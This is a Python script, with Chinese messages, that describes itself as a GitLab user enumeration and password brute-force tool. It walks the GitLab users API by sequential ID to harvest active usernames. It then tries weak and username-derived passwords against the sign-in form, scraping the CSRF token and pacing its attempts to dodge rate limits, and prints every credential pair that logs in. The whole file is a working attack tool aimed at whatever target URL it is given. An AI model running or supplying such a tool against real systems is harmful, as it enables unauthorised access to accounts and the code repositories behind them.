import requests
import argparse
import sys
from bs4 import BeautifulSoup
import time
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
'''
pip install bs4
pip install urllib3==1.26.7
pip install chardet==4.0.0
pip install charset_normalizer==2.0.0
'''

warnings.simplefilter('ignore', InsecureRequestWarning)
warnings.simplefilter('ignore', category=DeprecationWarning)
warnings.simplefilter('ignore', category=FutureWarning)

gitlab_url = ""
passwords =[
            "12345678",
            "123456789",
            "{{username}}123",
            "{{username}}123456",
            "{{username}}123456789",
            "1qaz@WSX"]
def open_url(url):
    """Opens a URL and returns the response."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36"
    }
    return requests.get(url, headers=headers)


def find_users():
    """Finds and returns a list of user data."""
    users = []
    print("正在尝试遍历用户")
    consecutive_failures = 0
    i = 0
    while True:
        if consecutive_failures >= 10:
            break
        url = f"{gitlab_url}/api/v4/users/{i}"
        resdata = open_url(url)
        time.sleep(1)
        if resdata.status_code == 200:
            consecutive_failures = 0
            data = resdata.json()
            if data["state"] == "active":
                print("发现用户:" + data["username"])
                users.append(data["username"])
            else:
                print("Block:" + data["username"])
        else:
            consecutive_failures += 1
        i += 1

    return users


def login(users):
    """Logs in to the website with the given users and returns the result."""
    login_url = f"{gitlab_url}/users/sign_in"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer":login_url
    }


    

    session = requests.session()

    results = []
    j = 0
    for username in users:
        password_found = False
        for password in passwords:
            if password_found:
                break
            time.sleep(1)
            j += 1
            if j == 10:
                time.sleep(10)
                j = 0
            try:
                response = session.get(login_url, headers=headers)
                soup = BeautifulSoup(response.text, "html.parser")
                try:
                    authenticity_token = soup.find("input", {"name": "authenticity_token"})["value"]
                except:
                    print(f"获取token失败: {username}")
                    break
                t_password = password.replace("{{username}}", username)
                data = {
                    "utf8": "✓",
                    "authenticity_token": authenticity_token,
                    "user[login]": username,
                    "user[password]": t_password,
                    "user[remember_me]": "0",
                    "commit": "Sign in",
                }

                login_response = session.post(
                    login_url, headers=headers, data=data, allow_redirects=False
                )

                if "Invalid Login or password" in login_response.text:
                    print(f"尝试登录 {username} 失败。密码 {t_password} 无效。")
                    sys.stdout.flush()
                elif login_response.status_code == 302:
                    print(f"成功登录 {username}。密码为 {t_password}。")
                    sys.stdout.flush()
                    results.append((username, t_password, True))
                    session.cookies.clear()
                    password_found = True
                else:
                    print(f"尝试登录 {username} 失败。")
                    sys.stdout.flush()
                    results.append((username, t_password, False))
            except requests.exceptions.RequestException as e:
                print(f"发生错误: {e}")
                sys.stdout.flush()
                results.append((username, t_password, str(e)))

    return results


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="GitLab用户枚举与密码爆破工具")
    parser.add_argument("url", help="目标GitLab地址，例如 http://target.com")
    parser.add_argument("-u", "--userfile", help="自定义用户字典文件路径，每行一个用户名", default=None)
    parser.add_argument("-o", "--output", help="发现用户保存文件路径", default="discovered_users.txt")
    args = parser.parse_args()

    gitlab_url = args.url

    usernames = []
    if args.userfile:
        print(f"从文件加载自定义用户: {args.userfile}")
        with open(args.userfile, "r", encoding="utf-8") as f:
            for line in f:
                username = line.strip()
                if username:
                    usernames.append(username)
        print(f"加载了 {len(usernames)} 个自定义用户")
    else:
        usernames = find_users()
        print("总共发现 " + str(len(usernames)) + " 个用户")
        if usernames:
            with open(args.output, "w", encoding="utf-8") as f:
                for u in usernames:
                    f.write(u + "\n")
            print(f"用户列表已保存到 {args.output}")

    if not usernames:
        print("未发现任何用户，退出。")
        exit()

    results = login(usernames)
    for username, password, result in results:
        if result == True:
            print(f"Successfully logged in as {username} with password {password}")
        elif result == False:
            print(f"Failed to log in as {username} with password {password}")
        else:
            print(result)
